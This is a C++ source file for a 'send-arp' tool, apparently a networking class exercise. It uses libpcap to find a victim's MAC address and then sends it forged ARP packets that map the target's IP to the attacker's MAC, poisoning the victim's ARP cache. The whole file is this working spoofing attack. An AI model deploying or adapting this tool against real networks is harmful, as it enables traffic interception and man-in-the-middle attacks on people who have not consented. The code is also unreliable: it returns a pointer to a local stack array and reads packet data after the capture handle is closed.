#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "pcap-test.h"
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <net/if.h> 
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>

#define MAC_ALEN 6
#define MAC_ADDR_FMT "%02X:%02X:%02X:%02X:%02X:%02X"
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL
};

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

u_int8_t * dump_pkt(const u_char *pkt_data, struct pcap_pkthdr* header);


uint8_t * GetInterfaceMacAddress(const char *ifname, uint8_t *mac_addr){
	struct ifreq ifr;
	int sockfd, ret;

	printf("Get interface(%s) Mac address\n", ifname);

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("Fail to get interface MAC address - socket() failed - %m\n");
		return NULL;
	}

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
		close(sockfd);
		return NULL;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
	close(sockfd);

	// printf("Success to get interface(%s) MAC address as "MAC_ADDR_FMT"\n", ifname, MAC_ADDR_FMT_ARGS(mac_addr));
	return mac_addr;
}

uint8_t * checkMyMac(char * dev){
	const char *ifname = dev;
	uint8_t mac_addr[MAC_ALEN];

	return GetInterfaceMacAddress(ifname, mac_addr);
}


int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}	

	uint8_t * myMac = checkMyMac(argv[1]);
	printf("Success to get interface MAC address as "MAC_ADDR_FMT"\n", MAC_ADDR_FMT_ARGS(myMac));
	char myMacStr[19];
	sprintf(myMacStr, "%02X:%02X:%02X:%02X:%02X:%02X", myMac[0], myMac[1], myMac[2], myMac[3], myMac[4], myMac[5]);

	EthArpPacket packet;
	
	for(int i = 1; i<= (argc/2-1); i++){
		char* dev = argv[1];
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		// argv[i*2]의 mac주소 알아내기
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = Mac(myMacStr);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(myMacStr);
		packet.arp_.sip_ = htonl(Ip(argv[i*2 + 1]));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(argv[i*2]));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		dev = argv[1];
		pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (pcap == NULL) {
			fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
			return -1;
		}

		u_int8_t *sender_mac = NULL;
		while (true) {
			sender_mac = NULL;
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(pcap, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
				break;
			}
			sender_mac = dump_pkt(packet, header);
			if(sender_mac){
				break;
			}
		}
		printf("Sender MAC : %02x:%02x:%02x:%02x:%02x:%02x\n\n",
		sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]); //mac주소 출력
		
		pcap_close(pcap);

		// ARP cache 바꾸기.
		char senderMacStr[19];
		sprintf(senderMacStr, "%02X:%02X:%02X:%02X:%02X:%02X", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);
		packet.eth_.dmac_ = Mac(senderMacStr);
		packet.eth_.smac_ = Mac(myMacStr);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(myMacStr);
		packet.arp_.sip_ = htonl(Ip(argv[i*2 + 1]));
		packet.arp_.tmac_ = Mac(senderMacStr);
		packet.arp_.tip_ = htonl(Ip(argv[i*2]));
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		pcap_close(handle);
	}
	
}

u_int8_t * dump_pkt(const u_char *pkt_data, struct pcap_pkthdr* header){
    struct libnet_ethernet_hdr *eth_hdr; 
    eth_hdr = (struct libnet_ethernet_hdr *)pkt_data; 
    u_int16_t eth_type = ntohs(eth_hdr->ether_type); 

    if(eth_type!=ETHERTYPE_ARP) return NULL;

    struct ArpHdr *arp_hdr = (struct ArpHdr *)(pkt_data+sizeof(ether_header)); 

    u_int8_t *dst_mac = eth_hdr->ether_dhost; 
    u_int8_t *src_mac = eth_hdr->ether_shost; 
    
	if(ntohs(arp_hdr->op_)== 2){
		printf("Dst MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",
        dst_mac[0],dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5]); 

    	printf("Src MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",
        src_mac[0],src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]); 
		return src_mac;
	}
	return NULL;
}